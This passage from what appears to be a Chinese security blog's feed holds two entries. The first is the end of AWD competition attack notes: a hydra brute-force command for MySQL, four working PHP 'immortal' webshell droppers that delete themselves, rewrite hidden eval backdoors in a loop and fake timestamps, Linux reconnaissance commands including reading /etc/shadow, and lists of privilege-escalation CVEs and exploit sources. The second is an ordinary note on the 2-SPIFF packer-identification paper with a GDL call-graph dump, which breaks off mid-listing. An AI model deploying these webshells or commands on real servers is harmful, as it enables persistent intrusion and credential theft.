class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql<br></code></pre></td></tr></table></figure><h3 id="3-3-内网渗透"><a href="#3-3-内网渗透" class="headerlink" title="3.3# 内网渗透"></a>3.3# 内网渗透</h3><h4 id="3-3-1-权限维持之不死马"><a href="#3-3-1-权限维持之不死马" class="headerlink" title="3.3.1 权限维持之不死马"></a>3.3.1 权限维持之不死马</h4><p>简单不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">//PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//ignore_user_abort如果设置为 TRUE，则忽略与用户的断开，脚本将后台运行</span><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);     <span class="hljs-comment">//删除自身</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;AabyssTeam&quot;]);?&gt;&#x27;</span>);  <span class="hljs-comment">//创建shell.php</span><br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0</span>);    <span class="hljs-comment">//间隔时间</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过不断复写 <code>shell.php</code> 来达到该木马难以被使用的效果</p><p>防连接不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">// 取消脚本运行时间的超时上限</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// </span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>);  <span class="hljs-comment">//创建shell.php</span><br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure><p>进阶不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 09:10:12&quot; shell.php&#x27;</span>);  <span class="hljs-comment">//修改时间，防止被删</span><br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 <code>shell.php</code> 的WebShell文件</p><p>双重不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.login.php&#x27;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;/admin/.register.php&#x27;</span>; <br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 18:10:12&quot; .login.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-12-01 18:10:12&quot; /admin/.register.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure><p>浏览器访问写入的WebShell，会自动生成两个不死马： <code>.login.php</code> 和 <code>/admin/.register.php</code></p><h4 id="3-3-2-关键文件检索"><a href="#3-3-2-关键文件检索" class="headerlink" title="3.3.2 关键文件检索"></a>3.3.2 关键文件检索</h4><p>组件检索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name <span class="hljs-string">&quot;apaech2.conf&quot;</span>                 <span class="hljs-comment">//检索Apache主配置文件</span><br>find / -name <span class="hljs-string">&quot;nginx.conf&quot;</span>                   <span class="hljs-comment">//检索Nginx目录</span><br>find / -path <span class="hljs-string">&quot;*nginx*&quot;</span> -name nginx*conf     <span class="hljs-comment">//检索Nginx配置目录</span><br>find / -name <span class="hljs-string">&quot;httpd.conf&quot;</span>                   <span class="hljs-comment">//检索Apache目录</span><br>find / -path <span class="hljs-string">&quot;*apache*&quot;</span> -name apache*conf   <span class="hljs-comment">//检索Apache配置目录</span><br></code></pre></td></tr></table></figure><p>网站首页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name <span class="hljs-string">&quot;index.php&quot;</span>                    <span class="hljs-comment">//定位网站目录</span><br>find / -name <span class="hljs-string">&quot;index.html&quot;</span>                   <span class="hljs-comment">//定位网站目录</span><br></code></pre></td></tr></table></figure><p>日志文件检索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">/var/<span class="hljs-built_in">log</span>/nginx/                           <span class="hljs-comment">//默认Nginx日志目录</span><br>/var/<span class="hljs-built_in">log</span>/apache/                          <span class="hljs-comment">//默认Apache日志目录</span><br>/var/<span class="hljs-built_in">log</span>/apache2/                         <span class="hljs-comment">//默认Apache日志目录</span><br>/usr/local/tomcat/logs                    <span class="hljs-comment">//Tomcat日志目录</span><br>tail -f xxx.<span class="hljs-built_in">log</span>                           <span class="hljs-comment">//实时刷新滚动日志文件</span><br></code></pre></td></tr></table></figure><h4 id="3-3-3-Linux提权"><a href="#3-3-3-Linux提权" class="headerlink" title="3.3.3 Linux提权"></a>3.3.3 Linux提权</h4><p>查询系统版本信息命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/issue<br>cat /etc<span class="hljs-comment">/*-release</span><br><span class="hljs-comment">cat /etc/lsb-release</span><br><span class="hljs-comment">cat /etc/redhat-release</span><br></code></pre></td></tr></table></figure><p>查询内核版本信息命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">uname -a<br>uname -mrs<br>cat /proc/version<br>cat /etc/issue<br>lsb_release -a<br>hostnamectl  <br>rpm -q kernel<br>dmesg | grep Linux<br>ls /boot | grep vmlinuz<br></code></pre></td></tr></table></figure><p>查看系统环境变量命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>env<br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>查看语言环境信息命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc<br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>查看文件上传环境信息命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp<br></code></pre></td></tr></table></figure><p>这里列举一些可用利用的提权漏洞：</p><ul><li>CVE-2023-0386（Linux OverlayFS权限提升漏洞）</li><li>CVE-2021-4034（Linux Polkit本地权限提升漏洞）</li><li>CVE-2017-6074 （DCCP双重释放漏洞 &gt; 2.6.18 ）</li><li>CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)）</li><li>CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</li><li>CVE-2017-1000367（sudo本地提权漏洞 ）</li><li>CVE-2016-1247（Nginx权限提升漏洞）</li><li>CVE-2017-16995（Ubuntu16.04   kernel:4.14-4.4）</li></ul><p>Kali命令查询：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> CentOS <span class="hljs-number">7</span><br><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><p>提权Exploit寻找：</p><ul><li><a href="http://www.exploit-db.com/">http://www.exploit-db.com</a></li><li><a href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></li><li><a href="http://securityreason.com/">http://securityreason.com</a></li><li><a href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></li><li><a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main</a></li></ul><p>编译提权Exp</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -o <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<span class="hljs-regexp">/***** /u</span>sr<span class="hljs-regexp">/share/</span>nginx<span class="hljs-regexp">/html/</span>*****.c -Wall<br></code></pre></td></tr></table></figure><p>直接提权，确认权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p>其他提权姿势：<a href="https://www.freebuf.com/articles/system/244627.html">https://www.freebuf.com/articles/system/244627.html</a></p><h4 id="3-3-4-Windows提权"><a href="#3-3-4-Windows提权" class="headerlink" title="3.3.4 Windows提权"></a>3.3.4 Windows提权</h4><p>这里列举一些Windows的漏洞：</p><ul><li>各种Potato（Github上面基本都有）</li><li>CVE-2023-35359（Windows内核权限提升漏洞，开源了）</li><li>CVE-2022-24521（没有Exp的可以找我要）</li><li>CVE-2019-1405</li><li>CVE-2019-1322</li><li>MS17-017（整型溢出漏洞）</li></ul><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4# 参考链接"></a>4# 参考链接</h2><ul><li><a href="http://freebuf.com/">http://freebuf.com/</a></li><li><a href="https://blog.zgsec.cn/">https://blog.zgsec.cn/</a></li><li><a href="https://paper.seebug.org/3044/">https://paper.seebug.org/3044/</a></li><li><a href="https://www.anquanke.com/">https://www.anquanke.com/</a></li><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li><a href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a></li><li><a href="https://xz.aliyun.com/t/12687">https://xz.aliyun.com/t/12687</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>AWDPwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2-SPIFF 论文阅读笔记</title>
    <link href="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>许多恶意软件通过加壳来绕过检测，因此准确高效的加壳器识别（Packer Identification）方法对恶意软件检测来说十分重要，本文给出<a href="https://dl.acm.org/doi/abs/10.1007/s10489-021-02347-w"><code>2-SPIFF</code></a>——一种2段式的加壳器识别方法，阶段一通过从程序的FCG图中提取特征来辨别程序是否加壳，阶段二通过从FCG图和文件属性中提取的融合特征来识别加壳器。</p><h1 id="0x01-Background"><a href="#0x01-Background" class="headerlink" title="0x01. Background"></a>0x01. Background</h1><p>恶意软件会对组织或个人设备造成严重损坏，许多恶意软件通过代码混淆和反调试来绕过检测，代码混淆技术包括冗余代码生成、花指令和加壳技术。奥萨格于2016年指出，80%的恶意软件使用了加壳技术。加壳技术通常会破坏原始程序的汇编代码，因此基于汇编代码的静态分析检测方法将变得不可行。<br>加壳器识别本质上是个分类问题，因此机器学习被广泛应用于该问题中，在先前的研究中，许多图结构被用来构建分类模型，包括数据流图、系统调用依赖图、函数调用图（FCG）和持续执行图（CEG）。<code>2-SPIFF</code>基于<em><strong>函数调用图（FCG）和文件属性</strong></em>。</p><div class="note note-info">            <p>之所以使用FCG是因为它直观的展示了程序的控制流程，且相当于CEG，FCG的节点和边都会更少，生成FCG的时间比CEG更快。</p>          </div><div class="note note-success">            <p>还需要文件属性的原因是不同加壳器生成的加壳程序可能会有相同的FCG图，因此需要进一步从文件属性中提取能够区分不同加壳器的特征</p>          </div><h1 id="0x02-Main-Steps"><a href="#0x02-Main-Steps" class="headerlink" title="0x02. Main Steps"></a>0x02. Main Steps</h1><p><code>2-SPIFF</code>框架：<br><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/1.png"></p><h2 id="step1-File-preprocessing"><a href="#step1-File-preprocessing" class="headerlink" title="step1. File preprocessing"></a>step1. File preprocessing</h2><p>通过类似IDA Pro的静态分析工具提取出GDL，从而得到FCG</p><div class="note note-success">            <p>Graph Description Language（GDL）一种中间语言，用于描述图中节点和边的关系</p>          </div><p>以下是一个GDL文件实例：</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        点击显/隐内容    </div>    <div class='spoiler-content'>        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs GDL">graph: &#123;<br>title: &quot;Call flow of vuln&quot;<br>// IDA palette<br>colorentry 32: 0 0 0<br>colorentry 33: 0 0 255<br>colorentry 34: 0 0 255<br>colorentry 35: 128 128 128<br>colorentry 36: 128 128 128<br>colorentry 37: 0 0 128<br>colorentry 38: 0 0 128<br>colorentry 39: 0 0 255<br>colorentry 40: 0 0 255<br>colorentry 41: 0 0 128<br>colorentry 42: 0 128 0<br>colorentry 43: 0 255 0<br>colorentry 44: 0 128 0<br>colorentry 45: 255 128 0<br>colorentry 46: 0 128 0<br>colorentry 47: 128 128 255<br>colorentry 48: 255 0 0<br>colorentry 49: 128 128 0<br>colorentry 50: 1 1 1<br>colorentry 51: 192 192 192<br>colorentry 52: 0 0 255<br>colorentry 53: 0 0 255<br>colorentry 54: 0 0 255<br>colorentry 55: 128 128 128<br>colorentry 56: 128 128 255<br>colorentry 57: 0 128 0<br>colorentry 58: 0 0 128<br>colorentry 59: 0 0 255<br>colorentry 60: 128 0 128<br>colorentry 61: 0 128 0<br>colorentry 62: 0 128 0<br>colorentry 63: 0 128 64<br>colorentry 64: 0 0 128<br>colorentry 65: 0 0 128<br>colorentry 66: 255 0 255<br>colorentry 67: 128 128 0<br>colorentry 68: 0 0 128<br>colorentry 69: 0 0 255<br>colorentry 70: 0 0 128<br>colorentry 71: 0 0 255<br>colorentry 72: 0 0 0<br>colorentry 73: 255 255 255<br>colorentry 74: 192 187 175<br>colorentry 75: 0 255 255<br>colorentry 76: 0 0 0<br>colorentry 77: 128 0 0<br>colorentry 78: 128 128 128<br>colorentry 79: 128 128 0<br>colorentry 80: 255 0 255<br>colorentry 81: 0 0 0<br>colorentry 82: 0 0 255<br>colorentry 83: 0 0 0<br>colorentry 84: 50 205 50<br>node: &#123; title: &quot;0&quot; label: &quot;.init_proc&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;1&quot; label: &quot;sub_401020&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;2&quot; label: &quot;sub_401030&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;3&quot; label: &quot;sub_401040&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;4&quot; label: &quot;sub_401050&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;5&quot; label: &quot;sub_401060&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;6&quot; label: &quot;sub_401070&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;7&quot; label: &quot;sub_401080&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;8&quot; label: &quot;sub_401090&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;9&quot; label: &quot;sub_4010A0&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;10&quot; label: &quot;sub_4010B0&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;11&quot; label: &quot;sub_4010C0&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;12&quot; label: &quot;sub_4010D0&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;13&quot; label: &quot;.free&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;14&quot; label: &quot;.puts&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;15&quot; label: &quot;.write&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;16&quot; label: &quot;.__stack_chk_fail&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;17&quot; label: &quot;.printf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;18&quot; label: &quot;.read&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;19&quot; label: &quot;.malloc&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;20&quot; label: &quot;.setvbuf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;21&quot; label: &quot;.__isoc99_scanf&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;22&quot; label: &quot;.exit&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;23&quot; label: &quot;_start&quot; color: green bordercolor: black &#125;<br>node: &#123; title: &quot;24&quot; label: &quot;_dl_relocate_static_pie&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;25&quot; label: &quot;deregister_tm_clones&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;26&quot; label: &quot;register_tm_clones&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;27&quot; label: &quot;__do_global_dtors_aux&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;28&quot; label: &quot;frame_dummy&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;29&quot; label: &quot;menu&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;30&quot; label: &quot;get_choice&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;31&quot; label: &quot;add_chunk&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;32&quot; label: &quot;delete_chunk&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;33&quot; label: &quot;view_chunk&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;34&quot; label: &quot;manba&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;35&quot; label: &quot;init&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;36&quot; label: &quot;main&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;37&quot; label: &quot;atexit&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;38&quot; label: &quot;.term_proc&quot; color: 76 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;39&quot; label: &quot;free&quot; color: 80 textcolor: 73 bordercolor: black &#125;<br>node: &#123; title: &quot;40&quot; label: &quot;__libc_start_main&quot; color: 80 